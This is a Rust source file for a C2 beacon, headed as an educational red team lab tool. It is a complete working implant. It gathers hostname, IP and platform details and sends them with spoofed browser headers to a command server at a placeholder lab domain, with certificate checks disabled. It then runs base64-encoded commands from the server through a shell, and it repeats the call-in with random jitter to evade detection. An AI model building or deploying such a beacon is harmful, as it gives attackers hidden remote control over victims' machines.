// RustBeacon - Stealthy Lab C2 Beacon
// FOR EDUCATIONAL PURPOSES IN CONTROLLED RED TEAM LABS

use std::{thread, time::Duration};
use std::process::Command;
use rand::{thread_rng, Rng};
use reqwest::blocking::{Client, Response};
use serde::{Serialize, Deserialize};
use base64::{encode as b64encode, decode as b64decode};

// JSON structure for outbound beacon
#[derive(Serialize)]
struct BeaconPayload {
    hostname: String,
    local_ip: String,
    platform: String,
}

// JSON structure for inbound response
#[derive(Deserialize)]
struct BeaconResponse {
    cmd: Option<String>,
}

// Fake browser headers
fn fake_headers() -> Vec<(&'static str, &'static str)> {
    vec![
        ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        ("Accept", "application/json"),
        ("X-Requested-With", "XMLHttpRequest"),
    ]
}

fn get_hostname() -> String {
    let output = Command::new("hostname").output().unwrap_or_default();
    String::from_utf8_lossy(&output.stdout).trim().to_string()
}

fn get_ip() -> String {
    let output = Command::new("hostname")
        .arg("-I")
        .output()
        .unwrap_or_default();
    String::from_utf8_lossy(&output.stdout).trim().split_whitespace().next().unwrap_or("0.0.0.0").to_string()
}

fn get_platform() -> String {
    let output = Command::new("uname").arg("-a").output().unwrap_or_default();
    String::from_utf8_lossy(&output.stdout).trim().to_string()
}

fn send_beacon(client: &Client, c2_url: &str, payload: &BeaconPayload) {
    let req = client.post(c2_url).json(payload);
    let mut req = req;
    for (key, value) in fake_headers() {
        req = req.header(key, value);
    }

    match req.send() {
        Ok(resp) => handle_response(resp),
        Err(e) => eprintln!("[!] Beacon failed: {}", e),
    }
}

fn handle_response(resp: Response) {
    if let Ok(text) = resp.text() {
        if let Ok(data) = serde_json::from_str::<BeaconResponse>(&text) {
            if let Some(encoded) = data.cmd {
                if let Ok(bytes) = b64decode(&encoded) {
                    let cmd = String::from_utf8_lossy(&bytes);
                    println!("[+] Executing: {}", cmd);
                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(cmd.trim())
                        .output()
                        .unwrap_or_default();
                    println!("{}", String::from_utf8_lossy(&output.stdout));
                }
            }
        }
    }
}

fn jitter_sleep(min: u64, max: u64) {
    let delay = thread_rng().gen_range(min..=max);
    thread::sleep(Duration::from_secs(delay));
}

fn main() {
    let c2_url = "https://myc2lab.example.com/api/status"; // Use HTTPS!
    println!("[*] Beacon started → {}", c2_url);
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // ✅ Só em laboratório!
        .build()
        .expect("Failed to create HTTP client");

    loop {
        let payload = BeaconPayload {
            hostname: get_hostname(),
            local_ip: get_ip(),
            platform: get_platform(),
        };

        send_beacon(&client, c2_url, &payload);
        jitter_sleep(20, 45); // Beacon entre 20 e 45 segundos
    }
}
